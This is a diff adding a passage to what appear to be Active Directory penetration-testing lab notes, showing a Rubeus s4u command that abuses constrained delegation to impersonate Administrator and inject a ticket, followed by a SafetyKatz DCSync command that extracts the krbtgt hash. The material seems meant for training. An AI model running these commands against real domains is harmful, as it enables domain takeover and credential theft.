@@ -434,4 +434,24 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 
 
 
+- Abusing with `Rubeus`
 
+
+- We can use the following command (We are requesting a TGT and TGS in a single command):
+
+
+```powershell
+Rubeus.exe s4u /user:dcorp-adminsrv$
+/aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d027
+8d30dc1b445 /impersonateuser:Administrator
+/msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL
+/altservice:ldap /ptt
+```
+
+- After injection, we can run `DCSync`:
+
+
+```powershell
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync
+/user:dcorp\krbtgt" "exit"
+```
